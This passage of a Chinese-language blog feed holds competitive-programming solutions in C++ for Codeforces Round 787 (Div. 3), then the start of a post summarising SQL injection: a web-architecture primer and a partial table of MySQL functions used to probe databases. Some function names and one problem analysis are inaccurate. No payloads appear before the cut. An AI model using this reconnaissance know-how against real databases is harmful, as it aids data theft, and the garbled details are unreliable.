class="params">(num[<span class="number">2</span>]+num[<span class="number">3</span>]&gt;=y)</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Make-It-Increasing"><a href="#B-Make-It-Increasing" class="headerlink" title="B. Make It Increasing"></a>B. Make It Increasing</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你一个数组，一次操作可以让它整除2，问最后能通过最少多少次操作让序列严格递增。因为操作只会使得数字变小，那么我们不难得到，如果要让它操作次数最小，最后一个数不能动。然后依次往前，如果前面的比后面的大那就进行一次操作，直到 <code>a[i]&lt;a[i-1]||a[i]==0</code> 因为到0了整除就不会变了，因此这个条件需要加上去。</p><p>最后只需要判断第一个数和第二个数是否都为0即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i]&gt;=a[i+<span class="number">1</span>]&amp;&amp;a[i])&#123;</span><br><span class="line">            a[i]/=<span class="number">2</span>;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">1</span>]==<span class="number">0</span>&amp;&amp;a[<span class="number">2</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);    </span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Detective-Task"><a href="#C-Detective-Task" class="headerlink" title="C. Detective Task"></a>C. Detective Task</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>一开始还以为是逻辑推理题，正面思考无果之后发现一点：当一个人是小偷的时候，这个人前面全为1或者?，后面全为0或者?当遍历第 i 个人的时候，<code>cnt(?|1)=i-1 cnt(?|0)=n-i</code></p><p>如果要判断这个人是不是小偷，只需要看其他人说的全为真话时， 能否证明它是小偷，因此我就不用管它说了什么，直接滚动过去判断就好了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    s[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> cnt1=<span class="number">0</span>,cnt0=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)cnt0++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">            cnt0--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i<span class="number">-1</span>]==<span class="string">&#x27;?&#x27;</span>||s[i<span class="number">-1</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            cnt1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt0==len-i&amp;&amp;cnt1==i<span class="number">-1</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>树链剖分板题，而且只要轻重链剖分完了就可以直接输出了。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Replace-With-the-Previous-Minimize"><a href="#E-Replace-With-the-Previous-Minimize" class="headerlink" title="E. Replace With the Previous, Minimize"></a>E. Replace With the Previous, Minimize</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/5.png" alt="5"></p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题有点小意思，意思就是一次操作能把一个字符串的所有特定字符变小 <code>1</code>，问你 <code>k</code> 次操作生成的字典序最小的字符串是什么。首先有一点肯定没错，就是我无脑把前面不是 <code>a</code> 的字符先都变 <code>a</code> 了肯定不会有问题。但是有一点需要考虑，那就是先变前面，如果后面还有比这个大一点的，那就又需要很多次才能变成 <code>a</code> 了，所以我们的思路就是收集所有能在 <code>k</code> 次范围内变成 <code>a</code> 的字符，从左到右遍历，显而易见，k&gt;=25则一定可以达到全 <code>a</code> 的状态。遇到了不能在 <code>k</code> 次变成 <code>a</code> 的字符之后，把前面取得的最大次数先用掉，如果次数有剩余，无脑给那一个字符即可。</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">char</span> ch)</span></span>&#123;</span><br><span class="line">    <span class="comment">//putchar(ch);putchar(10);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==ch)s[i]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%s\n&quot;,s);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">if</span>(k&gt;=<span class="number">25</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]-<span class="string">&#x27;a&#x27;</span>&gt;k)&#123;</span><br><span class="line">            <span class="keyword">int</span> th=k-q;</span><br><span class="line">            <span class="keyword">char</span> cc=s[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;th;j++)&#123;</span><br><span class="line">                <span class="comment">//printf(&quot;%d &quot;,j);</span></span><br><span class="line">                <span class="comment">//putchar(cc-j);</span></span><br><span class="line">                <span class="built_in">change</span>(cc-j);</span><br><span class="line">                <span class="comment">//putchar(s[i]-j);putchar(10);</span></span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=q;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">                <span class="built_in">change</span>(<span class="string">&#x27;a&#x27;</span>+j);</span><br><span class="line">            &#125;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        q=<span class="built_in">max</span>(q,s[i]-<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,q);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在 rating 还没出来，不知道能不能蓝，不过我知道如果 A 不失误是一定有机会蓝名的，下次再接再厉吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1675&quot;&gt;Codeforces Round #787 (Div. 3)&lt;/a&gt; 题解来了。&lt;/p&gt;
&lt;p&gt;实况在&lt;a href=&quot;https://www.bilibili.com/video/bv1eF411j7Uz&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>sql注入总结</title>
    <link href="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-05-03T16:00:00.000Z</published>
    <updated>2022-05-09T03:39:26.216Z</updated>
    
    <content type="html"><![CDATA[<p>sql学了也有一段时间了，想着把能用到的知识点都写一遍好。</p><span id="more"></span><p>先瞎jb扯几句</p><h2 id="WEB框架"><a href="#WEB框架" class="headerlink" title="WEB框架"></a>WEB框架</h2><p><code>web</code>应用一改我们平时常见的 <code>p2p</code> 和 <code>C/S</code> 模式，采用 <code>B/S</code> 模式。随着网络技术的发展，特别随着Web技术的不断成熟，B/S 这种软件体系结构出现了。<strong>浏览器-服务器（Browser/Server）结构</strong>，简称 <code>B/S</code> 结构，与 <code>C/S</code>不同，其客户端不需要安装专门的软件，只需要浏览器即可，浏览器与Web服务器交互，Web服务器与后端数据库进行交互，可以方便地在不同平台下工作。</p><p>比如我们玩的英雄联盟就是典型的 <code>C/S</code> 结构的服务，因为有大量图片资源和 <code>3D</code> 模型存储在本地，因此提前安装好客户端就可以方便地与服务器进行交互，如果采用 <code>B/S</code> 结构的话，在我们游戏开始的时候就要与服务器建立连接，下载好各种资源到本地，然后再与服务器进行交互，各种页游均是 <code>B/S</code> 结构。<code>B/S</code> 的优势就是对需要服务一方的电脑要求较低，很容易可以兼容系统上的差异，客户往往只需要安装浏览器便可以享受全部的  <code>web</code> 服务。<code>web</code> 应用会先向我们的浏览器发送前端语言 <code>javascript</code> 或者 <code>html</code> 给浏览器解析执行，我们经过一定的操作之后会向服务器发送请求，然后服务器根据我们的请求做出不同的答复，这个答复还是前端语言形成的网页。</p><p>服务器会根据什么规则去响应请求，这个就要用到后端语言了，如 <code>php</code>,<code>aspx</code> 等都是常见的后端语言，现在以 <code>php</code> 为主。比如我们实现一个登录页面，那么这个登录肯定是会用到数据库查询操作的，我们将请求提交给服务器之后，后端语言得到我们发送的数据，然后后端语言就会相应地构造 <code>sql</code> 语句去执行数据库查询，并根据查询结果来响应我们</p><p>那么我们很清晰了，我们负责发送数据，<code>php</code> 构造 <code>sql</code> 语句去查询。首先明白一点，<code>sql</code> 语句肯定我们能控制，因为我输入什么它就要去查什么。我们的输入一定会被嵌入 <code>sql</code> 语句。如果我们在 <code>sql</code> 中能输入任意内容，那我就相当于直接控制了整个数据库。<code>sql</code> 注入的就这么产生了，带来的本质危害也就是数据库信息泄露，如果数据库配置权限过高甚至能让攻击者拿到 <code>shell</code>。</p><h2 id="sql语言"><a href="#sql语言" class="headerlink" title="sql语言"></a>sql语言</h2><p><code>SQL</code>(<code>Structured Query Language</code>，结构化查询语言)是一种特定目的程式语言，用于管理关系数据库管理系统（<code>RDBMS</code>），或在关系流数据管理系统（<code>RDSMS</code>）中进行流处理。<br><code>SQL</code>基于关系代数和元组关系演算，包括一个数据定义语言和数据操纵语言。<code>SQL</code>的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。尽管<code>SQL</code>经常被描述为，而且很大程度上是一种声明式编程（<code>4GL</code>），但是其也含有过程式编程的元素。(from wiki)</p><p>我们最常用的数据库系统是<code>mysql</code>。</p><h2 id="Mysql常用函数"><a href="#Mysql常用函数" class="headerlink" title="Mysql常用函数"></a>Mysql常用函数</h2><h3 id="数据库基本信息函数"><a href="#数据库基本信息函数" class="headerlink" title="数据库基本信息函数"></a>数据库基本信息函数</h3><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>user()</td><td>用户名</td></tr><tr><td>system_user()</td><td>系统用户名</td></tr><tr><td>curent_user()</td><td>前用户名</td></tr><tr><td>session_user()</td><td>连接数据库的用户名</td></tr><tr><td>database()</td><td>当前选择的数据库</td></tr><tr><td>version()</td><td>数据库版本</td></tr><tr><td>@@data_dir()</td><td>数据库路径</td></tr><tr><td>@@base_dir()</td><td>数据库安装路径</td></tr><tr><td>@@version_compile_os</td><td>操作系统</td></tr></tbody></table><p>注意，这些函数都无参数且在使用时必须使用 <code>select</code> 关键字输出。</p><h3 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" 